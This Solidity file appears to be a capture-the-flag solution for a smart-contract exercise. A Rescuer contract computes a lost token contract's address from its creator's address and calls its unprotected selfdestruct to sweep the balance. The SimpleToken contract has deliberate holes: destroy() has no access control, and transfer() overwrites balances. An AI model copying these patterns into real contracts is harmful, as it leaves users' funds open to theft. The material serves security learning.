// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Rescuer {
    address payable victim;

    constructor(address payable _victim) {
        victim = _victim;
    }

    function recoverRead(
        address _targetContract
    ) public pure returns (address) {
        address derivedAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            _targetContract,
                            bytes1(0x01)
                        )
                    )
                )
            )
        );
        return derivedAddress;
    }

    function recover(address _targetContract) external {
        address derivedAddress = recoverRead(_targetContract);
        ISimpleToken targetToken = ISimpleToken(derivedAddress);
        targetToken.destroy(victim);
    }
}

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

interface ISimpleToken {
    function transfer(address _to, uint _amount) external;

    function destroy(address payable _to) external;
}

contract SimpleToken {
    string public name;
    mapping(address => uint) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
